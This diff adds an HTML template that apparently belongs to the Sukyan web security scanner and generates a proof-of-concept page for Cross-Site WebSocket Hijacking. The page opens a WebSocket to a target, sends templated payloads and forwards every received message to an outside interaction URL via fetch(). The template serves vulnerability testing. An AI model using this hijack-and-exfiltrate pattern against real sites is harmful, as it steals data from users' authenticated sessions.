@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>CSWH PoC - Sukyan</title>
+  </head>
+  <body>
+    <h1>CSWH PoC</h1>
+    <div>
+      <button onclick="replay()">Replay</button>
+    </div>
+    <div id="log"></div>
+    <script>
+      var headers = {{.RequestHeaders}};
+      var websocket;
+
+      function logMessage(message) {
+          var logDiv = document.getElementById("log");
+          var newLog = document.createElement("div");
+          newLog.textContent = message;
+          logDiv.appendChild(newLog);
+      }
+
+      function startWebSocket() {
+          websocket = new WebSocket('{{.URL}}');
+
+          websocket.onopen = function(event) {
+              logMessage("WebSocket opened");
+              {{- range .Messages }}
+              websocket.send(`{{ js .PayloadData }}`);
+              logMessage(`Sent: {{ js .PayloadData }}`);
+              {{- end }}
+          };
+
+          websocket.onmessage = function(event) {
+              logMessage("Received: " + event.data);
+              fetch('{{.InteractionURL}}?' + event.data, {mode: 'no-cors', method: 'POST', body: event.data});
+          };
+
+          websocket.onclose = function(event) {
+              logMessage("WebSocket closed: Code=" + event.code + ", Reason=" + event.reason);
+          };
+
+          websocket.onerror = function(event) {
+              logMessage("WebSocket error: " + JSON.stringify(event, null, 2));
+          };
+      }
+
+      function replay() {
+          if (websocket) {
+              websocket.close();
+          }
+          document.getElementById("log").innerHTML = "";
+          startWebSocket();
+      }
+    </script>
+  </body>
+</html>
